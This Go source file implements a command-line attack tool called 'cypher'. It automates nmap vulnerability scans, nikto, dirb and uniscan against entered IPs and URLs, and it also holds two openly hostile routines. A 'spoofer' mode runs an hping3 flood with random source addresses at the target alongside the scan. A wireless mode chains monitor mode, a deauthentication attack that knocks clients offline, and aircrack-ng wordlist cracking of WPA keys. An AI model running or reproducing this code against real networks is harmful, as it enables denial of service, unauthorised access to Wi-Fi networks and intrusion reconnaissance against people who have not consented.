package main

import (
	"fmt"
	"os/exec"
	"os"
	"strings"
	"context"
    "sync"
	"net"
	"bufio"
	"bytes"
	"path/filepath"
	"strconv"
)

// COLORS
const (
	Red   = "\033[31m"
	Green = "\033[32m"
	Reset = "\033[0m"
)

func main() {

	if len(os.Args) != 2 {
		fmt.Println("Usage: cypher [options]")
		return
	}

	switch os.Args[1] {
	case "-h", "--help":
		help()
	case "-v":
		vamp()
	case "--file", "-f" :
		ScanFile()
	case "-nS", "--net-scan":
		netScan()
	case "-m":
		MonitorMode()
	default:
		fmt.Println("Invalid option. Use '-h' or '--help' for usage instructions.")
	}
}


//command lines
func help() {
	fmt.Println("Help \n")
	fmt.Println("Command line >> ")
	fmt.Println("Command 				Usage")
	fmt.Println()
	fmt.Println("	-h 	 --help			      Shows the command line")
	fmt.Println("	-f  	   --file			   Runs Vamp with your own file file with targets")
	fmt.Println("	-v						Starts cypher scanner for specific URL/IP")
	fmt.Println("	-nS	--net-scan		Scans the local network for Targets")
	fmt.Println("	-m					      Network Monitor")
	fmt.Println("\n")
	fmt.Println(" ! WARNING : High number of IPs for concurrent scans using the --file argument may affect your system performance")
    fmt.Println("             Using the spoofing option for target scans might cause a dos attack depending on the specific network")
}


// Vamp from here to ???

func vamp() {
	fmt.Printf(Icon())

	// Define the directory path to save the output files
	outputDir := "SCAN_results/"

	// Create the directory if it doesn't exist
	if _, err := os.Stat(outputDir); os.IsNotExist(err) {
		os.Mkdir(outputDir, 0755)
	}

	// Input
	var ips string
	fmt.Println(Red + "Who we checkin lil bro ?" + Reset)
	fmt.Fprintln(os.Stderr, Red+"Enter multiple IP addresses separated by spaces:"+Reset)
	fmt.Print("IP addresses " + Red + ">> " + Reset)
	// Read input from standard input
	reader := bufio.NewReader(os.Stdin)
	ips, _ = reader.ReadString('\n')

	ipList := strings.Fields(ips)

	// Print the list of IP addresses received
	fmt.Println("IP addresses received:", ipList)

	// Loop through each IP address and process them one by one
	for _, ip := range ipList {
		if isValidIP(ip) {
			processIP(ip, outputDir)
		} else {
			fmt.Printf("Invalid IP: %s\n", ip)
		}
	}

	fmt.Println("All scans completed.")
}


func isValidIP(ip string) bool {
	return net.ParseIP(ip) != nil
}

func processIP(ip, outputDir string) {
	fmt.Printf("Target set to " + Red + ">> %s\n", Green+ip+Reset)
	if isHostAlive(ip) {
		runNmap(ip, outputDir)
		runNikto(ip, outputDir)
		getSpecificURL(ip, outputDir)
	} else {
		fmt.Printf("%s is 6 feet under :(.\n", ip)
	}
}

func isHostAlive(ip string) bool {
	fmt.Println("Checking if target is reachable")
	check := exec.Command("ping", "-c", "5", ip)
	if err := check.Run(); err != nil {
		return false
	}
	fmt.Println(Green + "Target " + ip + " is alive... for now. ;)" + Reset)
	return true
}

func runNmap(ip, outputDir string) {
    // Define the accepted options
    accept := map[string]bool{
        "a": true,
        "A": true,
        "q": true,
        "Q": true,
        "s": true,
        "S": true,
    }

    // Prompt the user for input until a valid option is provided
    var scan string
    for {
        fmt.Print("(A)ggresive, (S)poofer, (Q)uick scan " + Red + ">> " + Reset)
        fmt.Scanln(&scan)

        // Check if the input is valid
        if _, ok := accept[scan]; ok {
            break // Exit the loop if the input is valid
        }

        fmt.Println("Invalid option, please choose again.")
    }

    // Create channels for synchronization
    done := make(chan bool, 2)
    

    // Close the done channel when the function returns
    defer close(done)

    // Run nmap based on the selected scan type
    switch scan {
    case "a", "A":
        runNmapAggressive(ip, outputDir, done)
    case "s", "S":
        runNmapSpoof(ip, outputDir,)
    case "q", "Q":
        runNmapQuick(ip)
    default:
        fmt.Println("Invalid scan type")
    }
}


func runNmapAggressive(ip, outputDir string, done chan<- bool) {
    fmt.Print("Ports (max port, empty for default): ")
    var ports string
    fmt.Scanln(&ports)
    if len(ports) == 0 {
        ports = "10000"
    } else {
        // Validate if the input is a number
        if _, err := strconv.Atoi(ports); err != nil {
            fmt.Println(Red + "Invalid input. Port must be a number." + Reset)
            done <- false // Signal that the nmap scan is done with an error
            return
        }
    }
    fmt.Printf("Using nmap "+Green+"Aggressive Scan"+Reset+" for IP first %s ports"+Red+">> "+Reset+"%s\n",
        Green+ports+Reset, Red+ip+Reset)
    cmd := exec.Command("nmap", "-sV", "-sC", "-O", "-p1-"+ports, "--open", "--stats-every", "30s",
        "-oA", outputDir+"nmap_output_"+ip, "--script", "vuln", ip)
    fmt.Println(Red + "------------------------------------------------------------")
    cmd.Stdout = os.Stdout
    fmt.Println("------------------------------------------------------------" + Reset)

    if err := cmd.Run(); err != nil {
        fmt.Println(Red + "could not run nmap command:", err, Reset)
    }
    fmt.Println(Red + " =============================================================" + Reset)

    // Signal that the nmap scan is done
    done <- true
}
func runNmapSpoof(ip, outputDir string) {
    fmt.Printf("Using nmap with " + Green + "Spoofed Mac for IP " + Red + ">> " + Reset + "%s\n", Red+ip+Reset)

    // Create a channel to communicate when nmap completes
    nmapDone := make(chan bool)
    // Run nmap command
    go func() {
        defer close(nmapDone) // Signal that nmap is done when the function returns
        cmd := exec.Command("nmap", "-sS", "-sC", "-O", "-p1-1000", "--open", "--reason", "--stats-every", "30s", "-oA", outputDir+"nmap_output_"+ip, "-f", "--spoof-mac", "00:00:00:00:00:00", "--script", "vuln", ip)
        fmt.Println(Red + "------------------------------------------------------------")
        cmd.Stdout = os.Stdout
        fmt.Println("------------------------------------------------------------" + Reset)

        if err := cmd.Run(); err != nil {
            fmt.Println(Red+"could not run nmap command:", err, Reset)
        }
        fmt.Println(Red + " =============================================================" + Reset)
    }()

    // Run hping3 command concurrently with nmap
    hpingCmd := exec.Command("hping3", "--flood", "--rand-source", ip)
    hpingCmd.Stdout = os.Stdout

    if err := hpingCmd.Start(); err != nil {
        fmt.Println(Red+"could not start hping3 command:", err, Reset)
        return
    }

    // Wait for nmap to complete
    <-nmapDone

    // Stop hping3 command
    fmt.Println("Stopping hping3")
    if err := hpingCmd.Process.Kill(); err != nil {
        fmt.Println(Red+"could not stop hping3:", err, Reset)
    } else {
        fmt.Println(Green + "hping3 command stopped" + Reset)
    }
}

func runNmapQuick(ip string) {
    fmt.Printf("Using nmap " + Green + "Quick Scan" + Reset + " for IP (ALL PORTS , UDP , TCP , ICMB)" + Red + ">> " + Reset + "%s\n", Red+ip+Reset)
    cmd := exec.Command("nmap", "-T4", "-sS", "-PE", "-PS", "-PA", "-PP", "-PM", "-p0-", ip)
    fmt.Println(Red + "------------------------------------------------------------")
    cmd.Stdout = os.Stdout
    fmt.Println("------------------------------------------------------------" + Reset)

    if err := cmd.Run(); err != nil {
        fmt.Println(Red+"could not run nmap command:", err, Reset)
    }
    fmt.Println(Red + " =============================================================" + Reset)
}

func runNikto(ip, outputDir string) {
    fmt.Printf("Using Nikto for IP " + Red + ">> " + Reset + "%s\n", Green+ip+Reset)
    // Specify the output directory path along with the filename
    niktoCmd := exec.Command("nikto", "-h", ip, "-ssl", "-Format", "txt", "-maxtime", "300", "-Tuning", "123bde", "-output", outputDir+"nikto_output_"+ip+".txt")
    niktoCmd.Stdout = os.Stdout
    if err := niktoCmd.Run(); err != nil {
        fmt.Println(Red+"Could not run Nikto command", err, Reset)
    }
    fmt.Println(Red + "==============================================" + Reset)
}
// URL 
func sanitizeURL(url string) string {
    // Replace problematic characters with underscores
    sanitized := strings.ReplaceAll(url, "://", "_")
    sanitized = strings.ReplaceAll(sanitized, ":", "_")
    sanitized = strings.ReplaceAll(sanitized, "/", "_")
    return sanitized
}
func getSpecificURL(ip, outputDir string) {
	for {
		var site string
		fmt.Printf("Enter the URL for IP %s or press Enter to scan the next IP: %s\n", Green+ip+Reset, Red)
		fmt.Scanln(&site)
		if len(site) == 0 {
			fmt.Println(Green + "Scanning the next IP..." + Reset)
			break
		}

		// Sanitize the URL to make it suitable for use as a filename
		sanitizedURL := sanitizeURL(site)

		ctx, cancel := context.WithCancel(context.Background())

		// Use wait group for synchronization
		var wg sync.WaitGroup
		wg.Add(3)

		// Dirb
		go func() {
			defer wg.Done()
			fmt.Printf("Using dirb for URL " + Red + ">> " + Reset + "%s\n", Green+site+Reset)
			dirbCmd := exec.CommandContext(ctx, "dirb", site, "-r", "-S", "-N", "404", "-o", outputDir+"dirb_output_"+sanitizedURL+".txt")
			dirbCmd.Stdout = os.Stdout
			if err := dirbCmd.Run(); err != nil {
				fmt.Println(Red + "Could not run dirb command:", err, Reset)
			}
		}()

		// Uniscan
		go func() {
			defer wg.Done()
			fmt.Printf("Using Uniscan for URL " + Red + ">> " + Reset + "%s\n", Green+site+Reset)
			uniscanCmd := exec.CommandContext(ctx, "uniscan", "-u", site, "-qwe", "-o", outputDir+"uniscan_output_"+sanitizedURL+".txt")
			uniscanCmd.Stdout = os.Stdout
			if err := uniscanCmd.Run(); err != nil {
				fmt.Println(Red + "Could not run Uniscan command:", err, Reset)
			}
		}()

		// Nmap Firewall scanning
		go func() {
			defer wg.Done()
			fmt.Println("Detecting Web Firewalls " + Red + ">> " + Reset)
			nmapCmd := exec.CommandContext(ctx, "nmap", "-p443", "--script", "http-waf-detect", "--script-args", "http-waf-detect.aggro,http-waf-detect.detectBodyChanges", site)
			nmapCmd.Stdout = os.Stdout
			if err := nmapCmd.Run(); err != nil {
				fmt.Println(Red + "Could not run Nmap command:", err, Reset)
			}
		}()

		// Wait for all goroutines to finish
		wg.Wait()

		// Close the context after all goroutines have finished
		cancel()
	}
}
// ??


// Scan ip from file concurently
func ScanFile() {
    fmt.Print("File with targets " + Red + ">> " + Reset)
    var fileToScan string
    fmt.Scanln(&fileToScan)
    // Read IP list from file
    ipList, err := readIPListFromFile(fileToScan)
    if err != nil {
        fmt.Printf("Error reading IP list: %v\n", err)
        return
    }

    // Define the directory path to save the output files
    outputDir := "FileScanned/"

    // Create the directory if it doesn't exist
    if _, err := os.Stat(outputDir); os.IsNotExist(err) {
        os.Mkdir(outputDir, 0755)
    }

    var wg sync.WaitGroup
    var mu sync.Mutex // Mutex for protecting buffer
    var outputBuffer bytes.Buffer // Buffer to collect output
    done := make(chan struct{}, len(ipList)) // Buffered channel

    for _, ip := range ipList {
        if isValidIP(ip) {
            wg.Add(1)
            go func(ip string) {
                defer wg.Done()
                scanOutput := MassiveScan(ip, outputDir)
                mu.Lock()
                defer mu.Unlock()
                outputBuffer.WriteString(scanOutput)
                done <- struct{}{}
            }(ip)
        } else {
            fmt.Printf("Invalid IP: %s\n", ip)
        }
    }

    go func() {
        wg.Wait()
        close(done) // Close done channel when all goroutines are done
    }()

    // Wait for all scans to finish
    for range ipList {
        <-done
    }

    // Print the output at the end
    fmt.Println(outputBuffer.String())

	// Combine the XML files into one
	combinedXMLFile := outputDir + "combined.xml"
	fmt.Println("Combining XML files into:", combinedXMLFile)

	// Check the list of XML files in the directory
	xmlFiles, err := filepath.Glob(outputDir + "*.xml")
	if err != nil {
		fmt.Println("Error finding XML files:", err)
		return
	}
	fmt.Println("Found XML files:", xmlFiles)

	// Create the combined XML file
	xmlFile, err := os.Create(combinedXMLFile)
	if err != nil {
		fmt.Println("Error creating combined XML file:", err)
		return
	}
	defer xmlFile.Close()

	// Concatenate the XML files
	cmd := exec.Command("cat", xmlFiles...)
	cmd.Stdout = xmlFile
	if err := cmd.Run(); err != nil {
		fmt.Println("Error combining XML files:", err)
		return
	}

	fmt.Println("Combined XML file created successfully:", combinedXMLFile)
}


func readIPListFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err // Return error if file cannot be opened
	}
	defer file.Close()

	var ipList []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		ip := scanner.Text()
		ipList = append(ipList, ip)
	}
	if err := scanner.Err(); err != nil {
		return nil, err // Return error if there's an error during scanning
	}

	return ipList, nil
}

func MassiveScan(ip, outputDir string) string {
    var output bytes.Buffer // Buffer to collect output
    fmt.Printf("Starting " + Green + "Scan" + Reset + " for IP " + Red + ">> " + Reset + "%s\n", Red+ip+Reset)
    outputFile := outputDir + ip + ".txt"
    cmd := exec.Command("nmap", "-T5", "-A", "--open", "-oA", outputFile, ip)
    fmt.Println(Green + "scanning " + Reset + " ..." + Red)
    cmd.Stdout = &output // Redirect command output to buffer
    fmt.Println("------------------------------------------------------------" + Reset)

    if err := cmd.Run(); err != nil {
        fmt.Println(Red+"could not run nmap command:", err, Reset)
    }
    fmt.Println(Red + " =============================================================" + Reset)

    return output.String() // Return output as string
}

// NetScan from here to ****
func netScan() {
    var subnet string
    fmt.Print("Enter the subnet address (e.g., 192.168.1.0/24, empty for default): ")
    fmt.Scanln(&subnet)
    if subnet == "" {
        subnet = "192.168.1.0/24"
    }
    fmt.Println(Green + "Scanning " + Reset + subnet + Red + " >>" + Reset)
    // Define the Nmap command with the subnet address and options to scan for alive hosts with open ports
    cmd := exec.Command("nmap", "-p80,443,21,22,20", "-oG", "-", "-T4", subnet)

    // Execute the command
    output, err := cmd.CombinedOutput()
    if err != nil {
        fmt.Println("Error:", err)
        return
    }

    // Parse the output to extract alive hosts with open ports
    scannedHosts := parseNmapOutput(string(output))

    // Check if no hosts were found
    if len(scannedHosts) == 0 {
        fmt.Println("No hosts found.")
        return
    }

    // Print the scanned hosts with open ports
    for host, ports := range scannedHosts {
        fmt.Printf("Scanned host: %s, Open Ports: %v\n", host, ports)
    }
}
	
// ParseNmapOutput parses the Nmap output and extracts alive hosts with open ports
func parseNmapOutput(output string) map[string][]string {
    scannedHosts := make(map[string][]string)

    lines := strings.Split(output, "\n")
    var currentHost string
    for _, line := range lines {
        // Check if the line indicates an alive host with open ports
        if strings.Contains(line, "Host:") && strings.Contains(line, "Status: Up") {
            // Extract the IP address from the line
            fields := strings.Fields(line)
            if len(fields) >= 2 {
                currentHost = fields[1]
            }
        } else if strings.Contains(line, "/open/") {
            // Extract port information from the line
            fields := strings.Fields(line)
            for _, field := range fields {
                // Check if the field contains an open port
                if strings.Contains(field, "/open/") {
                    // Extract the port number
                    port := strings.Split(field, "/")[0]
                    scannedHosts[currentHost] = append(scannedHosts[currentHost], port)
                }
            }
        }
    }

    return scannedHosts
}
// ****

// Ntwork Monitoring

func startMonitorMode(adapter string) error {
	fmt.Println("Starting Monitor mode.")
	cmd := exec.Command("airmon-ng", "start", adapter)
	return cmd.Run()
}

func captureTraffic() error {
	fmt.Println("Opening new terminal window and capturing wireless traffic")
	cmd := exec.Command("/bin/sh", "-c", "airodump-ng mon0")
	return cmd.Run()
}

func scanTarget(BSSID, channel string) error {
	fmt.Printf("Opening new terminal for target %s\n", BSSID)
	cmd := exec.Command("/bin/sh", "-c", fmt.Sprintf("airodump-ng --bssid %s -c %s --write WPAcrack mon0", BSSID, channel))
	return cmd.Run()
}

func deauthenticateTarget(BSSID string) error {
	fmt.Println("Turning target offline...")
	cmd := exec.Command("aireplay-ng", "--deauth", "100", "-a", BSSID, "mon0")
	return cmd.Run()
}

func crackWPA(key, wordlistfile string) error {
	fmt.Printf("Cracking WPA KEY %s\n", key)
	cmd := exec.Command("aircrack-ng", "-w", wordlistfile, "WPAcrack")
	return cmd.Run()
}

func MonitorMode() {
	// Enabling monitor mode
	fmt.Print("Specify Wireless adapter <<wlan0>>: ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	adapter := scanner.Text()

	if adapter == "" {
		adapter = "wlan0" // Default to wlan0 if no adapter is specified
	}

	if !strings.HasPrefix(adapter, "wlan") {
		fmt.Println(Red + "Monitor mode is only applicable to wireless adapters. Please specify a wireless adapter." + Reset)
		return
	}

	err := startMonitorMode(adapter)
	if err != nil {
		fmt.Println(Red + "Failed to enter monitor mode:" + Reset, err)
		return
	}
	fmt.Println("Monitor mode started " + Green + "successfully" + Reset + ".")

	// Scanning Wireless Traffic
	err = captureTraffic()
	if err != nil {
		fmt.Println(Red + "Failed to capture wireless traffic:" + Reset, err)
		return
	}

	// Focusing on Target
	var BSSID, channel, key, wordlistfile string

	fmt.Print("Target BSSID: ")
	scanner.Scan()
	BSSID = scanner.Text()

	fmt.Printf("Channel for %s: ", BSSID)
	scanner.Scan()
	channel = scanner.Text()

	err = scanTarget(BSSID, channel)
	if err != nil {
		fmt.Println(Red + "Failed to scan target:" + Reset, err)
		return
	}

	err = deauthenticateTarget(BSSID)
	if err != nil {
		fmt.Println(Red + "Failed to deauthenticate target:" + Reset, err)
		return
	}

	fmt.Print("Provide WPA key: ")
	scanner.Scan()
	key = scanner.Text()

	fmt.Print("Wordlist file (leave empty for default): ")
	scanner.Scan()
	wordlistfile = scanner.Text()
	if wordlistfile == "" {
		wordlistfile = "/pentest/passwords/wordlists/darkc0de"
	}

	err = crackWPA(key, wordlistfile)
	if err != nil {
		fmt.Println(Red + "Failed to crack WPA key:" + Reset, err)
		return
	}
}

/// Style
func Icon() string {
    art := `
             ,     ,
             (\____/)
             / @__@ \
            (  (oo)  )
             ` + "`" + `-.~~.-'
              /    \
            @/      \
           /        \
           |        |_    __
           |  @ |   \@  / /       Can't hide forever
           \   |       \/ /
            \  |     \   /
             \ |-----|
              ^^   /^\
            /^\/ ^ ^ ^ \
            / ^   ^  ^   ^\
            /  ^ ^ ^   ^    \
            / ^ ^  ^   ^  ^  ^ \
            /____________________ \
            / ^  ^  ^  ^  ^  ^  ^  ^ \
             ^                          ^
  `
    return art
}